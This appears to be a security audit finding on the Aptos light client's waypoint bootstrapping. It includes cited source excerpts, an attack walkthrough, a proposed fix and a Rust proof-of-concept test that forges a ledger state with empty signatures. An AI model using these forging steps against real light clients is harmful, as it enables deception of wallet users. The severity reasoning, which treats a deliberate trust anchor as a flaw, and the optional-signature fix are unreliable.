# Audit Report

## Title
Light Client State Forgery via Unverified Waypoint Bootstrapping

## Summary
The `TrustedState::from_epoch_waypoint()` function accepts arbitrary waypoints without cryptographic verification, allowing attackers to bootstrap light clients with completely forged blockchain state through phishing or MITM distribution of malicious waypoints. [1](#0-0) 

## Finding Description

The Aptos light client uses waypoints as trust anchors for state synchronization. A waypoint is simply a (version, hash) pair with no embedded cryptographic signatures or validator set information. [2](#0-1) 

When a light client bootstraps from a waypoint using `TrustedState::from_epoch_waypoint()`, it creates an `EpochWaypoint` variant that will be used to verify incoming state proofs. However, the waypoint verification logic contains a critical flaw:

**Waypoint verification only checks version and hash matching - NO signature verification:** [3](#0-2) 

When the `Waypoint` is used as a `Verifier` for `LedgerInfoWithSignatures`, it extracts only the inner `LedgerInfo` and ignores all signatures: [4](#0-3) 

This creates an exploitable attack path:

1. **Attacker creates forged state**: Craft a fake `LedgerInfo` containing an attacker-controlled `next_epoch_state` (validator set), arbitrary transaction accumulator hash, and any desired epoch/version
2. **Generate malicious waypoint**: Compute the waypoint hash from this forged `LedgerInfo`: `Waypoint { version: X, value: hash(forged_ledger_info) }`
3. **Distribution**: Distribute via phishing websites, compromised documentation, MITM attacks on HTTP waypoint downloads, or social media impersonation
4. **Light client initialization**: Victim calls `TrustedState::from_epoch_waypoint(malicious_waypoint)`
5. **Forge epoch change proof**: Attacker provides `EpochChangeProof` containing the forged `LedgerInfoWithSignatures` (signatures can be empty/invalid - they won't be checked)
6. **Verification bypass**: During `EpochChangeProof::verify()`, the waypoint verifier only checks version/hash match at line 107, allowing the forged proof to pass: [5](#0-4) 

7. **Complete compromise**: The attacker's fake validator set from `next_epoch_state` becomes the new verifier (line 111-114), and all subsequent state proofs will be verified against this attacker-controlled validator set

The code comment incorrectly claims verification will catch invalid waypoints: [6](#0-5) 

This is demonstrably false - verification succeeds when attackers provide matching forged data.

In contrast, when an `EpochState` (containing a real validator set) is used as the verifier, signature verification IS performed: [7](#0-6) 

## Impact Explanation

**Severity: HIGH** (per Aptos Bug Bounty criteria for "Significant protocol violations")

This vulnerability enables complete compromise of light clients:

- **Arbitrary state presentation**: Attackers can show fake account balances, transaction history, and smart contract states
- **Transaction manipulation**: Light clients may sign transactions believing they're interacting with legitimate contracts
- **Persistent compromise**: Once bootstrapped with a malicious waypoint, the light client remains compromised indefinitely
- **Scope**: Affects mobile wallets, SPV clients, browser extensions, and any application using light client verification

This breaks the **Cryptographic Correctness** invariant: "BLS signatures, VRF, and hash operations must be secure." The waypoint verification completely bypasses BLS signature validation, eliminating the cryptographic security foundation of the light client protocol.

While this doesn't directly affect consensus validators or full nodes, light clients are critical infrastructure for user-facing applications. A compromised light client can be used for phishing attacks, fake transaction approvals, or displaying fraudulent balance information.

## Likelihood Explanation

**Likelihood: MODERATE to HIGH**

Attack feasibility:
- **Technical complexity**: LOW - Attacker only needs to craft a fake LedgerInfo and compute its hash
- **Distribution vectors**: 
  - Phishing websites mimicking official Aptos documentation
  - MITM attacks on unencrypted waypoint.txt file downloads
  - Compromised third-party wallets or tutorials
  - Social media impersonation of official accounts
- **Victim behavior**: Users setting up new light clients need to obtain waypoints from somewhere; many may not verify authenticity

The legitimate waypoint distribution model assumes out-of-band trust: [8](#0-7) 

However, there is no cryptographic mechanism to verify waypoint authenticity, making social engineering attacks viable.

## Recommendation

**Immediate mitigation**: Waypoints should be digitally signed by a trusted authority (Aptos Foundation) using a well-known public key embedded in the client software.

**Proposed fix**:

1. Extend `Waypoint` structure to include a signature:
```rust
pub struct Waypoint {
    version: Version,
    value: HashValue,
    signature: Option<bls12381::Signature>, // Signed by trusted authority
}
```

2. Add signature verification in `Waypoint::verify()`:
```rust
pub fn verify(&self, ledger_info: &LedgerInfo, trusted_public_key: &bls12381::PublicKey) -> Result<()> {
    // Verify signature if present
    if let Some(signature) = &self.signature {
        let message = bcs::to_bytes(&(self.version, self.value))?;
        ensure!(
            signature.verify(&message, trusted_public_key).is_ok(),
            "Waypoint signature verification failed"
        );
    }
    
    // Existing version and hash checks
    ensure!(ledger_info.version() == self.version(), ...);
    let converter = Ledger2WaypointConverter::new(ledger_info);
    ensure!(converter.hash() == self.value(), ...);
    Ok(())
}
```

3. Update `from_epoch_waypoint()` to require signature verification:
```rust
pub fn from_epoch_waypoint(
    epoch_waypoint: Waypoint,
    trusted_public_key: &bls12381::PublicKey
) -> Result<Self> {
    ensure!(
        epoch_waypoint.signature.is_some(),
        "Waypoint must be signed for bootstrapping"
    );
    // Signature will be verified during first verify_and_ratchet call
    Ok(Self::EpochWaypoint(epoch_waypoint))
}
```

**Alternative approach**: Implement a trusted waypoint registry with on-chain governance, where waypoints are committed to the blockchain and can be verified by hash against this canonical source.

## Proof of Concept

```rust
use aptos_types::{
    block_info::BlockInfo,
    epoch_state::EpochState,
    ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
    aggregate_signature::AggregateSignature,
    trusted_state::TrustedState,
    epoch_change::EpochChangeProof,
    waypoint::Waypoint,
    validator_verifier::ValidatorVerifier,
};
use aptos_crypto::hash::HashValue;
use std::sync::Arc;

#[test]
fn test_malicious_waypoint_attack() {
    // 1. Attacker creates fake validator set
    let attacker_validators = vec![]; // Empty or fake validators
    let attacker_verifier = ValidatorVerifier::new(attacker_validators);
    let attacker_epoch_state = EpochState {
        epoch: 100,
        verifier: Arc::new(attacker_verifier),
    };
    
    // 2. Attacker crafts fake LedgerInfo with their validator set
    let forged_ledger_info = LedgerInfo::new(
        BlockInfo::new(
            99,  // epoch
            0,   // round
            HashValue::zero(),
            HashValue::random(), // fake state root
            1000000, // version
            1234567890, // timestamp
            Some(attacker_epoch_state.clone()), // attacker's validator set!
        ),
        HashValue::zero(),
    );
    
    // 3. Generate malicious waypoint from forged ledger info
    let malicious_waypoint = Waypoint::new_any(&forged_ledger_info);
    
    // 4. Victim initializes light client with malicious waypoint
    let victim_trusted_state = TrustedState::from_epoch_waypoint(malicious_waypoint);
    
    // 5. Attacker provides fake EpochChangeProof with forged ledger info
    let forged_li_with_sigs = LedgerInfoWithSignatures::new(
        forged_ledger_info.clone(),
        AggregateSignature::empty(), // No valid signatures needed!
    );
    let fake_epoch_proof = EpochChangeProof::new(
        vec![forged_li_with_sigs.clone()],
        false,
    );
    
    // 6. VULNERABILITY: Verification succeeds without checking signatures!
    let result = victim_trusted_state.verify_and_ratchet_inner(
        &forged_li_with_sigs,
        &fake_epoch_proof,
    );
    
    // This should fail but SUCCEEDS - light client is now compromised!
    assert!(result.is_ok(), "Malicious waypoint verification should fail but passes!");
    
    // 7. Light client now trusts attacker's validator set for all future verifications
    if let Ok(change) = result {
        match change {
            aptos_types::trusted_state::TrustedStateChange::Epoch { new_state, .. } => {
                println!("ATTACK SUCCESS: Light client now trusts attacker's validator set!");
                // All future state proofs will be verified against attacker_epoch_state
            }
            _ => {}
        }
    }
}
```

This test demonstrates that a light client bootstrapped with a malicious waypoint will accept forged state proofs without signature verification, completely compromising the security model.

---

**Notes**

The vulnerability exists because waypoints are designed as pure cryptographic commitments (version + hash) without self-authenticating properties. The system assumes waypoints are obtained through secure out-of-band channels, but provides no mechanism to verify this assumption. The code comment suggests verification will catch invalid waypoints, but this is incorrect - verification only validates structural consistency, not authenticity.

This is distinct from social engineering attacks on private keys (which are explicitly excluded). The vulnerability is a cryptographic design flaw in the light client protocol where the code accepts and trusts unverifiable data structures, not a user behavior problem.

### Citations

**File:** types/src/trusted_state.rs (L64-65)
```rust
    /// Note: we can't actually guarantee this waypoint is actually an epoch
    /// waypoint, but the sync will always fail to verify it's not.
```

**File:** types/src/trusted_state.rs (L66-68)
```rust
    pub fn from_epoch_waypoint(epoch_waypoint: Waypoint) -> Self {
        Self::EpochWaypoint(epoch_waypoint)
    }
```

**File:** types/src/waypoint.rs (L28-35)
```rust
#[derive(Clone, Copy, Debug, Default, Eq, PartialEq)]
#[cfg_attr(any(test, feature = "fuzzing"), derive(Arbitrary))]
pub struct Waypoint {
    /// The version of the reconfiguration transaction that is being approved by this waypoint.
    version: Version,
    /// The hash of the chosen fields of LedgerInfo.
    value: HashValue,
}
```

**File:** types/src/waypoint.rs (L62-79)
```rust
    pub fn verify(&self, ledger_info: &LedgerInfo) -> Result<()> {
        ensure!(
            ledger_info.version() == self.version(),
            "Waypoint version mismatch: waypoint version = {}, given version = {}",
            self.version(),
            ledger_info.version()
        );
        let converter = Ledger2WaypointConverter::new(ledger_info);
        ensure!(
            converter.hash() == self.value(),
            format!(
                "Waypoint value mismatch: waypoint value = {}, given value = {}",
                self.value().to_hex(),
                converter.hash().to_hex()
            )
        );
        Ok(())
    }
```

**File:** types/src/waypoint.rs (L82-85)
```rust
impl Verifier for Waypoint {
    fn verify(&self, ledger_info: &LedgerInfoWithSignatures) -> Result<()> {
        self.verify(ledger_info.ledger_info())
    }
```

**File:** types/src/epoch_change.rs (L106-114)
```rust
            // Try to verify each (epoch -> epoch + 1) jump in the EpochChangeProof.
            verifier_ref.verify(ledger_info_with_sigs)?;
            // While the original verification could've been via waypoints,
            // all the next epoch changes are verified using the (already
            // trusted) validator sets.
            verifier_ref = ledger_info_with_sigs
                .ledger_info()
                .next_epoch_state()
                .ok_or_else(|| format_err!("LedgerInfo doesn't carry a ValidatorSet"))?;
```

**File:** types/src/epoch_state.rs (L40-50)
```rust
impl Verifier for EpochState {
    fn verify(&self, ledger_info: &LedgerInfoWithSignatures) -> anyhow::Result<()> {
        ensure!(
            self.epoch == ledger_info.ledger_info().epoch(),
            "LedgerInfo has unexpected epoch {}, expected {}",
            ledger_info.ledger_info().epoch(),
            self.epoch
        );
        ledger_info.verify_signatures(&self.verifier)?;
        Ok(())
    }
```

**File:** config/src/config/base_config.rs (L58-63)
```rust
pub enum WaypointConfig {
    FromConfig(Waypoint),
    FromFile(PathBuf),
    FromStorage(SecureBackend),
    None,
}
```
